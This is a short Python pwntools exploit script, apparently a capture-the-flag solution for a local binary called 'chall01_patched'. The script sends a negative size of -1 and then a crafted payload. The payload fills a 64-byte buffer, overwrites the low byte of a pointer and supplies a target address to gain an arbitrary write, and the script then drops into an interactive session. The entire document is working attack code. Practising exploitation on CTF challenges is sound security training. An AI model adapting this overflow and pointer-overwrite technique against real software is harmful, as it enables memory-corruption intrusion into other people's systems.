#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall01_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
target = process([exe.path])

target.recvuntil(b"size: ")
target.sendline(b"-1")
target.recvuntil(b"data: ")

payload = b""
payload += b"AAAAAAAAAAAAAAAAAAAAAAA"  # what to write at address
payload += b"\x00"                     # null terminate it to ensure everything is ok
payload += b"A" * (64-len(payload))    # fill the buffer until the pointer is reached
payload += b"\x08"                     # overwrite LSB with 0x8 (the pointer will point now to unintialized variable location )
payload += p32( 0x41424344 )           # write  our unintialized variable pointer address (address where we want to write )
pause()
target.sendline(payload)
pause()
target.interactive()
